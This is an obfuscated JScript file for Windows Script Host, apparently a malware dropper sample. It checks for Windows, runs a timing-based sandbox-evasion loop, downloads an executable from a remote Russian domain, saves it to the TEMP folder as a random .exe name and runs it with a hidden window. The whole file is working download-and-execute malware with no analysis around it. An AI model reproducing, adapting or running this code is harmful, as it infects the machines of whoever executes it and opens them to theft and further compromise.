var A = false;
var X0 = "Create"+"Object";
var S = function R() {return WScript[X0]("WScript"+".Shell");}(), P = 11;
var K = "MSXML2"+".XMLHTTP";
var HZ = 2;
var Q = HZ - 2;
function G(Z){S["Run"](Z, Q, Q);};
function AN(){return K + "";};
function DZ(JE, G1){Q = Q * 1; return JE - G1;};
function J(){return X0;};
/*@cc_on
  @if (@_win32 || @_win64)
    A = true;
  @end
@*/
if (A)
{
var OS = "";
function M(){return 22;};
var K0 = 0; var MQ = 0;
function OP()
{
var WL = new this["Date"]();
var I = WL["getUTCMilliseconds"]();
WScript["Sleep"](M());
var WL = new this["Date"]();
var H0 = WL["getUTCMilliseconds"]();
WScript["Sleep"](M());
var WL = new this["Date"]();
var V = WL["getUTCMilliseconds"]();
var K0 = "DW";
K0 = DZ(H0, I);
var MQ = "HY";
MQ = DZ(V, H0);
OS = "open";
return DZ(K0, MQ);
}
var IO = false;
var SJ = false;
for (var W = Q; W < M() * 1; W++){if (OP() != Q){
IO = true; 
MQ = "31" + 11 * K0 + MQ; 
SJ = true; 
break;
}}
function H() {return ((IO == true) && (IO == SJ)) ? 1 : Q;};
if (IO && H() && SJ){
function X() {return S["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "oPZ95PnxPKny.ex" + "e";};
 BG = AN();
 A0 = WScript[X0](BG);
 var JQ = 1;
do { 
	for (;JQ;){
	try {
		if (JQ == 1)
		{
			A0[OS]("GET", "http://new.teamlight.ru/si8svf", false);
			A0["send"]();
			NF = "Sleep";
			JQ = 2;
		}
		WScript[NF](M() + 120); 
		if (A0["readystate"] < 2 * 2) continue;
		JQ = Q;
		function IT(G0) {var GT = (1, 2, 3, 4, 5, G0); return GT;};
		VG = WScript[J()]("ADODB.Stream");
		BG = VG;
		BG[OS]();
		BG["type"] = IT(1);
		BG["write"](A0["ResponseBody"]);
		VG["position"] = IT(Q);
		BG["Save" + "ToFile"](X(), 2);
		VG["cl"+"ose"]();
		TJ = X();
		G(TJ);
	} catch(WH){};};
}while (JQ);
}
}

